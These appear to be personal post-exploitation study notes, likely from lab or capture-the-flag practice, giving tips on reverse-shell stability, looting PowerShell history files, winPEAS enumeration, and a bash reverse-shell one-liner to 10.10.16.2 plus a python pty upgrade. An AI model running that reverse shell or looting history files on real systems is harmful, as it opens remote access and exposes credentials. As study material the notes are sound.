# Post Exploitation Notes

- Remember that reverse shells are unstable, as they depend on other programs to keep alive the connection. Do what you are going to do fast or upgrade your connection to a more stable handler like multi/handler and a shell like meterpreter.

- History files in Linux and Windows are a good thing to check during the post-exploitation phase. History file in Windows can be found on: `C:\Users\$USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\` and it is called `ConsoleHost_history.txt`.

- Consider that as soon as you get RCE using a non conventional way like a web shell or through any other mean different from a reverse or bind shell, try to establish a shell connection as soon as posible.

- A good Privilege Escalation Module that you can use to enumerate some information is winPEASx64.exe for windows. Or PEAS in general.

- Usually, shells in linux are a bit unstable and not really interactive, to upgrade it and make it fully interactive we can run `bash -c "bash -i >& /dev/tcp/10.10.16.2/1234 0>&1"` to run a bash shell. And we can run `python3 -c 'import pty;pty.spawn("/bin/bash")'` to turn it into a proper terminal.
